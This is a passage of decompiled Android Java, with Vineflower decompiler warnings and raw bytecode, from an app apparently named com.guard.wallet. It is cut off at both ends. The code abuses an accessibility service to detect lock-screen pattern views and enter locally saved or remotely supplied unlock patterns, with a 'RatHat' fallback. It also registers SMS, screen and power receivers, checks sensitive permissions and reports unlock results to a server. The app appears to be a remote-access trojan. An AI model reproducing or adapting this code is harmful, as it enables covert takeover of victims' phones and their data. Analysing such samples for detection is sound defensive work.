      return Z() != null && ContextCompat.checkSelfPermission(Z(), "android.permission.WRITE_SECURE_SETTINGS") == 0;
   }

   public static boolean j0() {
      if (!o0() && e.b() != null) {
         String var1 = e.b().getPackageName();
         Intent var0 = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
         StringBuilder var2 = new StringBuilder("package:");
         var2.append(var1);
         var0.setData(Uri.parse(var2.toString()));
         var0.addFlags(268435456);
         var0.addFlags(8388608);
         e.b().startActivity(var0);
         return true;
      } else {
         return false;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void j1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               PowerBroadcastReceiver var0;
               IntentFilter var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getPowerReceiver() != null) {
                     break label117;
                  }

                  var1 = new IntentFilter();
                  var1.addAction("android.intent.action.ACTION_POWER_CONNECTED");
                  var1.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
                  var1.addAction("android.intent.action.POWER_USAGE_SUMMARY");
                  var1.addAction("android.os.action.POWER_SAVE_MODE_CHANGED");
                  var0 = new PowerBroadcastReceiver();
                  MainApplication.getInstance().setPowerReceiver(var0);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var0, var1, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var0, var1);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "PowerBroadcastReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean k() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         var0 = var1;
         if (ContextCompat.checkSelfPermission(Z(), "android.permission.CAMERA") == 0) {
            var0 = true;
         }
      }

      return var0;
   }

   public static Bitmap k0(Bitmap var0, double var1) {
      ByteArrayOutputStream var7 = new ByteArrayOutputStream();
      var0.compress(CompressFormat.WEBP, 80, var7);
      byte[] var8 = var7.toByteArray();
      Bitmap var11 = BitmapFactory.decodeByteArray(var8, 0, var8.length);
      double var3 = (double)var11.getHeight() * var1 / (double)var11.getWidth();
      var0 = var11;
      if (var1 != 0.0) {
         var0 = var11;
         if (var3 != 0.0) {
            int var6 = var11.getWidth();
            int var5 = var11.getHeight();
            Matrix var10 = new Matrix();
            var10.postScale((float)(var1 / (double)var6), (float)(var3 / (double)var5));
            var0 = Bitmap.createBitmap(var11, 0, 0, var6, var5, var10, true);
         }
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void k1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               IntentFilter var0;
               ScreenBroadcastReceiver var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getScreenReceiver() != null) {
                     break label117;
                  }

                  var0 = new IntentFilter();
                  var0.addAction("android.intent.action.SCREEN_ON");
                  var0.addAction("android.intent.action.SCREEN_OFF");
                  var0.addAction("android.intent.action.DREAMING_STARTED");
                  var0.addAction("android.intent.action.DREAMING_STOPPED");
                  var0.addAction("android.intent.action.USER_PRESENT");
                  var1 = new ScreenBroadcastReceiver();
                  MainApplication.getInstance().setScreenReceiver(var1);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var1, var0, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var1, var0);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "ScreenBroadcastReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean l() {
      boolean var0;
      if (Z() != null && Z().getPackageManager().canRequestPackageInstalls()) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public static boolean l0() {
      if (Z() != null) {
         ConnectivityManager var0 = (ConnectivityManager)Z().getSystemService("connectivity");
         if (var0 != null) {
            NetworkInfo var1 = var0.getActiveNetworkInfo();
            if (var1 != null && var1.isConnected()) {
               return true;
            }
         }
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void l1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               IntentFilter var0;
               ShutDownBroadcastReceiver var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getShutDownReceiver() != null) {
                     break label117;
                  }

                  var0 = new IntentFilter();
                  var0.addAction("android.intent.action.ACTION_SHUTDOWN");
                  var0.addAction("android.intent.action.QUICKBOOT_POWEROFF");
                  var1 = new ShutDownBroadcastReceiver();
                  MainApplication.getInstance().setShutDownReceiver(var1);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var1, var0, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var1, var0);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "ShutDownBroadcastReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean m() {
      Context var1 = Z();
      boolean var0 = false;
      if (var1 != null) {
         if (VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_MEDIA_AUDIO") == 0) {
               var0 = true;
            }

            return var0;
         } else {
            return h();
         }
      } else {
         return false;
      }
   }

   public static boolean m0() {
      boolean var3 = p0();
      boolean var0 = true;
      boolean var1 = true;
      boolean var2 = true;
      if (!var3) {
         return true;
      } else if (MyAccessibilityService.P() != null) {
         MyAccessibilityService.I(MyAccessibilityService.Q());
         MyAccessibilityService var5 = MyAccessibilityService.P();
         CombineFilter var4 = new CombineFilter();
         StringCondition var6 = a.a.c(var4, "className", "android.widget.EditText");
         var4.getStringConditions().add(var6);
         var5.getClass();
         if (MyAccessibilityService.M(var4) != null) {
            return true;
         } else if (e.l()) {
            MyAccessibilityService var15 = MyAccessibilityService.P();
            CombineFilter var24 = t1();
            var15.getClass();
            UiObjectCollection var16 = MyAccessibilityService.L(var24);
            if (var16 != null && var16.size() >= 10) {
               return true;
            } else {
               var5 = MyAccessibilityService.P();
               var4 = s1();
               var5.getClass();
               UiObjectCollection var18 = MyAccessibilityService.L(var4);
               var5 = MyAccessibilityService.P();
               CombineFilter var29 = r1();
               var5.getClass();
               UiObjectCollection var27 = MyAccessibilityService.L(var29);
               if (var18 != null && var18.size() > 0 && var27 != null && var27.size() > 0) {
                  return true;
               } else {
                  var5 = MyAccessibilityService.P();
                  var4 = new CombineFilter();
                  var4.setStringConditions(new LinkedList<>());
                  var4.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_lock_pattern_view", null, null, null, null));
                  var5.getClass();
                  if (MyAccessibilityService.M(var4) != null) {
                     var0 = var2;
                  } else {
                     var0 = false;
                  }

                  return var0;
               }
            }
         } else if (e.i()) {
            MyAccessibilityService var12 = MyAccessibilityService.P();
            CombineFilter var22 = D0();
            var12.getClass();
            UiObjectCollection var13 = MyAccessibilityService.L(var22);
            if (var13 != null && var13.size() >= 10) {
               return true;
            } else {
               MyAccessibilityService var14 = MyAccessibilityService.P();
               CombineFilter var23 = new CombineFilter();
               var23.setStringConditions(new LinkedList<>());
               var23.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/colorLockPatternView", null, null, null, null));
               var14.getClass();
               if (MyAccessibilityService.M(var23) == null) {
                  var0 = false;
               }

               return var0;
            }
         } else {
            MyAccessibilityService var9 = MyAccessibilityService.P();
            CombineFilter var20 = v();
            var9.getClass();
            UiObjectCollection var10 = MyAccessibilityService.L(var20);
            if (var10 != null && var10.size() >= 10) {
               return true;
            } else {
               MyAccessibilityService var11 = MyAccessibilityService.P();
               CombineFilter var21 = new CombineFilter();
               var21.setStringConditions(new LinkedList<>());
               var21.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/lockPatternView", null, null, null, null));
               var11.getClass();
               if (MyAccessibilityService.M(var21) != null) {
                  var0 = var1;
               } else {
                  var0 = false;
               }

               return var0;
            }
         }
      } else {
         return false;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void m1() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               IntentFilter var0;
               SmsReceiver var1;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getSmsReceiver() != null) {
                     break label117;
                  }

                  var0 = new IntentFilter();
                  var0.addAction("android.provider.Telephony.SMS_RECEIVED");
                  var0.addAction("android.provider.Telephony.SMS_DELIVER");
                  var1 = new SmsReceiver();
                  MainApplication.getInstance().setSmsReceiver(var1);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var1, var0, 2);
                     break label114;
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var1, var0);
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "SmsReceiver 启动完成");
               break label117;
            } catch (Throwable var11) {
               var10000 = var11;
               boolean var16 = false;
               break label104;
            }
         }

         Throwable var14 = var10000;
         // $VF: monitorexit
         throw var14;
      }

      // $VF: monitorexit
   }

   public static boolean n() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         var0 = var1;
         if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_CONTACTS") == 0) {
            var0 = true;
         }
      }

      return var0;
   }

   public static boolean n0() {
      boolean var0 = r0();
      boolean var1 = true;
      if (!var0) {
         return true;
      } else {
         if (!p0()) {
            if (K()) {
               return true;
            }

            if (e.m()) {
               return true;
            }
         }

         var0 = var1;
         if (!h.n()) {
            if (h.o()) {
               var0 = var1;
            } else {
               var0 = false;
            }
         }

         return var0;
      }
   }

   public static boolean n1() {
      if (Z() != null) {
         try {
            Intent var0 = new Intent("android.settings.WIFI_SETTINGS");
            var0.addFlags(268435456);
            var0.addFlags(536870912);
            var0.addFlags(67108864);
            var0.addFlags(2097152);
            var0.addFlags(8388608);
            Z().startActivity(var0);
            return true;
         } catch (Exception var1) {
            q.s("ApplicationUtil", var1);
         }
      }

      return false;
   }

   public static boolean o() {
      Context var1 = Z();
      boolean var0 = false;
      if (var1 != null) {
         if (VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_MEDIA_IMAGES") == 0) {
               var0 = true;
            }

            return var0;
         } else {
            return h();
         }
      } else {
         return false;
      }
   }

   public static boolean o0() {
      if (Z() != null) {
         PowerManager var1 = (PowerManager)Z().getSystemService("power");
         if (var1 != null) {
            return var1.isIgnoringBatteryOptimizations(Z().getPackageName());
         }
      }

      return false;
   }

   public static boolean o1(List var0) {
      label32: {
         if (var0 != null && !var0.isEmpty()) {
            Log.d("UnLockUtils", "使用触点密码解锁");
            if (MyAccessibilityService.P() != null) {
               Log.d("UnLockUtils", "委托无障碍容器输入触点密码");
               if (t(var0)) {
                  Log.d("UnLockUtils", "委托无障碍容器输入触点密码完成");
                  w();
                  if (r()) {
                     var1 = "委托无障碍容器解锁完成";
                     break label32;
                  }
               }

               Log.e("UnLockUtils", "委托无障碍容器解锁失败");
            }

            if (h.e.S() != null && h.e.S().D()) {
               Log.d("UnLockUtils", "委托RatHat容器输入触点密码");
               if (h.e.S().c0(var0)) {
                  Log.d("UnLockUtils", "委托RatHat容器输入触点密码输入完成");
                  w();
                  if (r()) {
                     var1 = "委托RatHat容器解锁完成";
                     break label32;
                  }
               }

               Log.e("UnLockUtils", "委托RatHat容器解锁失败");
            }
         }

         return false;
      }

      Log.d("UnLockUtils", var1);
      return true;
   }

   public static boolean p() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         var0 = var1;
         if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_SMS") == 0) {
            var0 = true;
         }
      }

      return var0;
   }

   public static boolean p0() {
      return Z() != null ? ((KeyguardManager)Z().getSystemService("keyguard")).isDeviceLocked() : false;
   }

   public static boolean p1(ReqUnlockDeviceVO param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 000: aload 0
      // 001: astore 3
      // 002: aload 0
      // 003: ifnonnull 00e
      // 006: new com/guard/wallet/req/ReqUnlockDeviceVO
      // 009: dup
      // 00a: invokespecial com/guard/wallet/req/ReqUnlockDeviceVO.<init> ()V
      // 00d: astore 3
      // 00e: ldc_w "UnLockUtils"
      // 011: aload 3
      // 012: invokestatic com/guard/wallet/utils/h.N (Ljava/lang/Object;)Ljava/lang/String;
      // 015: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 018: pop
      // 019: invokestatic com/guard/wallet/LockActivity.b ()Lcom/guard/wallet/LockActivity;
      // 01c: ifnull 022
      // 01f: invokestatic com/guard/wallet/LockActivity.a ()V
      // 022: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 025: ifnull 044
      // 028: invokestatic com/guard/wallet/service/MyAccessibilityService.P ()Lcom/guard/wallet/service/MyAccessibilityService;
      // 02b: astore 0
      // 02c: aload 0
      // 02d: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 030: pop
      // 031: aload 0
      // 032: getfield com/guard/wallet/service/MyAccessibilityService.n Ljava/util/concurrent/atomic/AtomicBoolean;
      // 035: bipush 1
      // 036: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 039: goto 044
      // 03c: astore 0
      // 03d: ldc_w "MyAccessibilityService"
      // 040: aload 0
      // 041: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 044: invokestatic com/guard/wallet/utils/e.j ()Z
      // 047: ifne 057
      // 04a: invokestatic a1/q.S ()Z
      // 04d: ifne 057
      // 050: ldc_w "设备息屏,唤醒设备失败"
      // 053: astore 0
      // 054: goto 092
      // 057: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 05a: ifne 084
      // 05d: invokestatic com/guard/wallet/service/MyAccessibilityService.N ()Ljava/lang/String;
      // 060: ldc_w "com.android.systemui"
      // 063: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 066: ifeq 0af
      // 069: ldc_w "UnLockUtils"
      // 06c: ldc_w "设备处于屏保模式"
      // 06f: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 072: pop
      // 073: invokestatic com/guard/wallet/utils/g.T ()Z
      // 076: pop
      // 077: ldc_w "UnLockUtils"
      // 07a: ldc_w "滑动上拉完成"
      // 07d: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 080: pop
      // 081: goto 0af
      // 084: bipush 1
      // 085: invokestatic com/guard/wallet/utils/g.t0 (Z)V
      // 088: invokestatic com/guard/wallet/utils/g.T ()Z
      // 08b: ifne 09f
      // 08e: ldc_w "滑动上拉失败"
      // 091: astore 0
      // 092: ldc_w "UnLockUtils"
      // 095: aload 0
      // 096: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 099: pop
      // 09a: invokestatic com/guard/wallet/utils/g.P ()V
      // 09d: bipush 0
      // 09e: ireturn
      // 09f: ldc_w "UnLockUtils"
      // 0a2: ldc_w "滑动上拉完成"
      // 0a5: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0a8: pop
      // 0a9: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 0ac: ifne 0be
      // 0af: ldc_w "UnLockUtils"
      // 0b2: ldc_w "设备已解锁成功"
      // 0b5: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0b8: pop
      // 0b9: invokestatic com/guard/wallet/utils/g.Q ()V
      // 0bc: bipush 1
      // 0bd: ireturn
      // 0be: invokestatic com/guard/wallet/service/MyAccessibilityService.Q ()Lcom/guard/wallet/entity/UiObject;
      // 0c1: ifnull 12f
      // 0c4: invokestatic com/guard/wallet/service/MyAccessibilityService.Q ()Lcom/guard/wallet/entity/UiObject;
      // 0c7: ldc_w "GLOBAL_UNLOCK"
      // 0ca: invokevirtual com/guard/wallet/entity/UiObject.setUniqueId (Ljava/lang/String;)V
      // 0cd: invokestatic com/guard/wallet/service/MyAccessibilityService.Q ()Lcom/guard/wallet/entity/UiObject;
      // 0d0: astore 6
      // 0d2: getstatic com/guard/wallet/helper/d.a Ljava/util/concurrent/ConcurrentHashMap;
      // 0d5: astore 0
      // 0d6: aload 6
      // 0d8: ifnull 12f
      // 0db: ldc_w "GLOBAL_DELEGATE"
      // 0de: astore 0
      // 0df: aload 6
      // 0e1: invokevirtual com/guard/wallet/entity/UiObject.uniqueId ()Ljava/lang/String;
      // 0e4: invokestatic a1/q.B (Ljava/lang/Object;)Z
      // 0e7: ifne 0f0
      // 0ea: aload 6
      // 0ec: invokevirtual com/guard/wallet/entity/UiObject.uniqueId ()Ljava/lang/String;
      // 0ef: astore 0
      // 0f0: getstatic com/guard/wallet/helper/d.a Ljava/util/concurrent/ConcurrentHashMap;
      // 0f3: astore 7
      // 0f5: aload 7
      // 0f7: aload 0
      // 0f8: invokevirtual java/util/concurrent/ConcurrentHashMap.get (Ljava/lang/Object;)Ljava/lang/Object;
      // 0fb: checkcast java/util/concurrent/ConcurrentLinkedQueue
      // 0fe: astore 5
      // 100: aload 5
      // 102: astore 4
      // 104: aload 5
      // 106: ifnonnull 113
      // 109: new java/util/concurrent/ConcurrentLinkedQueue
      // 10c: astore 4
      // 10e: aload 4
      // 110: invokespecial java/util/concurrent/ConcurrentLinkedQueue.<init> ()V
      // 113: aload 4
      // 115: aload 6
      // 117: invokevirtual java/util/concurrent/ConcurrentLinkedQueue.add (Ljava/lang/Object;)Z
      // 11a: pop
      // 11b: aload 7
      // 11d: aload 0
      // 11e: aload 4
      // 120: invokevirtual java/util/concurrent/ConcurrentHashMap.put (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
      // 123: pop
      // 124: goto 12f
      // 127: astore 0
      // 128: ldc_w "com.guard.wallet.helper.d"
      // 12b: aload 0
      // 12c: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 12f: invokestatic com/guard/wallet/utils/h.g ()Lcom/guard/wallet/req/ReqUnlockDeviceVO;
      // 132: astore 0
      // 133: aload 0
      // 134: invokestatic com/guard/wallet/utils/h.t (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 137: ifeq 185
      // 13a: ldc_w "UnLockUtils"
      // 13d: ldc_w "使用本地已锁定密码解锁"
      // 140: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 143: pop
      // 144: aload 0
      // 145: invokestatic com/guard/wallet/utils/g.q1 (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 148: istore 2
      // 149: iload 2
      // 14a: ifeq 163
      // 14d: ldc_w "UnLockUtils"
      // 150: ldc_w "使用本地已锁定密码解锁成功"
      // 153: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 156: pop
      // 157: aload 0
      // 158: getstatic java/lang/Boolean.TRUE Ljava/lang/Boolean;
      // 15b: invokevirtual com/guard/wallet/req/ReqUnlockDeviceVO.setLocked (Ljava/lang/Boolean;)V
      // 15e: aload 0
      // 15f: astore 3
      // 160: goto 187
      // 163: ldc_w "UnLockUtils"
      // 166: ldc_w "使用本地已锁定密码解锁失败"
      // 169: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 16c: pop
      // 16d: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 170: monitorenter
      // 171: ldc_w "deviceCipherLocked"
      // 174: invokestatic com/guard/wallet/utils/h.w (Ljava/lang/String;)V
      // 177: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 17a: monitorexit
      // 17b: goto 187
      // 17e: astore 0
      // 17f: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 182: monitorexit
      // 183: aload 0
      // 184: athrow
      // 185: bipush 0
      // 186: istore 2
      // 187: iload 2
      // 188: istore 1
      // 189: iload 2
      // 18a: ifne 1b7
      // 18d: iload 2
      // 18e: istore 1
      // 18f: aload 3
      // 190: invokestatic com/guard/wallet/utils/h.t (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 193: ifeq 1b7
      // 196: ldc_w "UnLockUtils"
      // 199: ldc_w "使用远程密码解锁"
      // 19c: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 19f: pop
      // 1a0: aload 3
      // 1a1: invokestatic com/guard/wallet/utils/g.q1 (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 1a4: istore 2
      // 1a5: iload 2
      // 1a6: istore 1
      // 1a7: iload 2
      // 1a8: ifne 1b7
      // 1ab: ldc_w "UnLockUtils"
      // 1ae: ldc_w "远程密码解锁失败"
      // 1b1: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 1b4: pop
      // 1b5: iload 2
      // 1b6: istore 1
      // 1b7: iload 1
      // 1b8: istore 2
      // 1b9: aload 3
      // 1ba: astore 0
      // 1bb: iload 1
      // 1bc: ifne 220
      // 1bf: invokestatic com/guard/wallet/utils/h.f ()Lcom/guard/wallet/req/ReqUnlockDeviceVO;
      // 1c2: astore 4
      // 1c4: iload 1
      // 1c5: istore 2
      // 1c6: aload 3
      // 1c7: astore 0
      // 1c8: aload 4
      // 1ca: invokestatic com/guard/wallet/utils/h.t (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 1cd: ifeq 220
      // 1d0: ldc_w "UnLockUtils"
      // 1d3: ldc_w "使用本地已保存密码解锁"
      // 1d6: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 1d9: pop
      // 1da: aload 4
      // 1dc: invokestatic com/guard/wallet/utils/g.q1 (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)Z
      // 1df: istore 2
      // 1e0: iload 2
      // 1e1: ifeq 1fc
      // 1e4: ldc_w "UnLockUtils"
      // 1e7: ldc_w "使用本地已保存密码解锁成功"
      // 1ea: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 1ed: pop
      // 1ee: aload 4
      // 1f0: getstatic java/lang/Boolean.TRUE Ljava/lang/Boolean;
      // 1f3: invokevirtual com/guard/wallet/req/ReqUnlockDeviceVO.setLocked (Ljava/lang/Boolean;)V
      // 1f6: aload 4
      // 1f8: astore 0
      // 1f9: goto 220
      // 1fc: ldc_w "UnLockUtils"
      // 1ff: ldc_w "使用本地已保存密码解锁失败"
      // 202: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 205: pop
      // 206: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 209: monitorenter
      // 20a: ldc_w "deviceCipher"
      // 20d: invokestatic com/guard/wallet/utils/h.w (Ljava/lang/String;)V
      // 210: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 213: monitorexit
      // 214: aload 3
      // 215: astore 0
      // 216: goto 220
      // 219: astore 0
      // 21a: ldc_w com/guard/wallet/req/ReqUnlockDeviceVO
      // 21d: monitorexit
      // 21e: aload 0
      // 21f: athrow
      // 220: iload 2
      // 221: ifeq 243
      // 224: ldc_w "UnLockUtils"
      // 227: ldc_w "设备解锁成功"
      // 22a: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 22d: pop
      // 22e: invokestatic com/guard/wallet/utils/g.Q ()V
      // 231: aload 0
      // 232: getstatic java/lang/Boolean.TRUE Ljava/lang/Boolean;
      // 235: invokevirtual com/guard/wallet/req/ReqUnlockDeviceVO.setLocked (Ljava/lang/Boolean;)V
      // 238: aload 0
      // 239: invokestatic com/guard/wallet/utils/h.C (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)V
      // 23c: aload 0
      // 23d: invokestatic com/guard/wallet/http/l.B (Lcom/guard/wallet/req/ReqUnlockDeviceVO;)V
      // 240: goto 250
      // 243: ldc_w "UnLockUtils"
      // 246: ldc_w "设备解锁失败"
      // 249: invokestatic android/util/Log.e (Ljava/lang/String;Ljava/lang/String;)I
      // 24c: pop
      // 24d: invokestatic com/guard/wallet/utils/g.P ()V
      // 250: bipush 0
      // 251: invokestatic com/guard/wallet/utils/g.t0 (Z)V
      // 254: iload 2
      // 255: ireturn
   }

   public static boolean q() {
      Context var1 = Z();
      boolean var0 = false;
      if (var1 != null) {
         if (VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(Z(), "android.permission.READ_MEDIA_VIDEO") == 0) {
               var0 = true;
            }

            return var0;
         } else {
            return h();
         }
      } else {
         return false;
      }
   }

   public static LinkedHashSet q0() {
      LinkedHashSet var0 = new LinkedHashSet();
      if (Z() != null) {
         String var1 = Secure.getString(Z().getContentResolver(), "enabled_accessibility_services");
         if (!q.B(var1)) {
            String[] var2 = TextUtils.split(var1, ":");
            if (var2 != null && var2.length > 0) {
               var0.addAll(Arrays.asList(var2));
            }
         }
      }

      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean q1(ReqUnlockDeviceVO var0) {
      label453: {
         if (var0 != null) {
            if ((
